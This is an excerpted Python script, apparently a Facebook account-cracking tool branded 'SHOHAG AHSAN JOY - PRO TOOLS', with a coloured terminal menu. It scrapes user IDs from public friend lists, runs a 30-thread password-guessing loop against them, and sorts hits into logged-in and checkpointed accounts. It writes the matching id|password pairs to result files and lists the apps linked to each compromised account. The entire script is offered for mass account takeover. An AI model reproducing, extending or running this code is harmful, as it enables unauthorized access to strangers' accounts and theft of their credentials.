...
p = '\x1b[0;34m' # BIRU +
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'Mey','6':'Jun','7':'July','8':'August','9':'September','10':'October','11':'November','12':'Desember'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'Mey','06':'Jun','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Desember'}
...
def banner():
	clear()
	wel = '# SHOHAG AHSAN JOY - PRO TOOLS- V2'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2)
	
	au ='     _______           _______           _______  _______  \n    (  ____ \|\     /|(  ___  )|\     /|(  ___  )(  ____ \   \n    | (    \/| )   ( || (   ) || )   ( || (   ) || (    \/   \n    | (_____ | (___) || |   | || (___) || (___) || |   \n    (_____  )|  ___  || |   | ||  ___  ||  ___  || | ____    \n          ) || (   ) || |   | || (   ) || (   ) || | \_  )   \n    /\____) || )   ( || (___) || )   ( || )   ( || (___) |   \n    \_______)|/     \|(_______)|/     \||/     \|(_______)'
...
def login_lagi():
	...
	try:
		...
		sue = '# Login Failed, Because Lo Signal !!!'
...
def menu(my_name,my_id,my_birthday):
	...
	sol().print(fx)
	print(x+'['+h+'•'+x+'] \x1b[93mName Account   : '+str(my_name))
	print(x+'['+h+'•'+x+'] \x1b[93mUSER ID        : '+str(my_id))
	print(x+'['+h+'•'+x+'] \x1b[93mDate Of Birth  : '+str(birth))
	print(x+'['+h+'•'+x+'] \x1b[93mIp Device      : '+str(sh['origin']))
	io = '  [01] Clone ID From Public Friends \n  [02] Clone ID From Public Account (free) \n  [03] Check Crack Results \n  [04] Show Checkpoint \n  [00] EXIT'
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='MENU OPTIONS'))
	jh = input(x+'['+p+'•'+x+'] Selact : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:
		dump_massal()
...
def file():
	...
	print(x+'['+h+'•'+x+'] >>>Scanning Files--Wait A Moment...')
	time.sleep(2)
	teks = '# SELECT THE FILES YOU WANT TO CHECK'
	sol().print(mark(teks, style='green'))
	my_files = []
	try:
		lis = os.listdir('CP CONTROL')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
	...
	if len(my_files)==0:
		yy = '# YOU DON-T HAVE RESULTS TO CHECK'
		...
		teks2 = '# SELECT THE FILES YOU WANT TO CHECK'
...
def dump_massal():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] ENTER NUMBER ID(LIMITE 10)')
	try:
	...
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# TOTAL 👉 %s ID, DO NOT FORGET TO PRAY'%(len(id))
	if len(id)==0:
...
# PENGATURAN ID
def setting():
	wl = '# SETTING SEQUENCE ID'
	sol().print(mark(wl, style='green'))
	teks = '[01] Crack From Oldest Account (Strong)\n[02] Crack From Youngest Account (Normal)\n[03] Random Order of ID (Like)'
	tak = nel(teks, style='cyan')
	cetak(nel(tak, title='SETTING'))
	hu = input(x+'['+p+'★'+x+'] Selact : ')
	if hu in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif hu in ['2','02']:
		...
		sol().print(mark(ric, style='red'))
		exit()
	met = '# SELECT CRACK METHOD'
	sol().print(mark(met, style='green'))
	ioz = '[01] Method B-Fire(Fast)\n[02] Mobile Method (Slow Result OK)\n[03] Free Facebook Method (Very Slow'
	gess = nel(ioz, style='cyan')
	cetak(nel(gess, title='METHOD'))
	hc = input(x+'['+p+'★'+x+'] Selact : ')
	if hc in ['1','01']:
		method.append('api')
	elif hc in ['3','03']:
		method.append('free')
	...
	if aplik in ['y','Y']:
		...
		taplikasi.append('no')
	osk = input(x+'['+p+'★'+x+'] Press Enter To Start Cracking : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
# WORDLIST
def passwrd():
	ler = '# WHILE SHIFTING THE MOON, PRESS CTRL+Z TO STOP '
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	tanya = '# WANT TO CHECK THE CRACK RESULTS OPTIONS?'
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s>>Cracking %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='SHOHAG-CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='SHOHAG-OK'))
					break
					...
					if "Accessed using Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						...
						if "You don't have an active app or website to review." in cek:
							...
							for muncul in apkAktif:
								...
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "You don't have an expired app or website for review" in cek2:
							infoakun += (f"\nNo Expired Apps Associated\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Expired Apps :\n")
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Cannot Check Option (Check Login In Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
...
def cek_opsi():
	...
	input(x+'['+h+'•'+x+'] Press Enter To Check ')
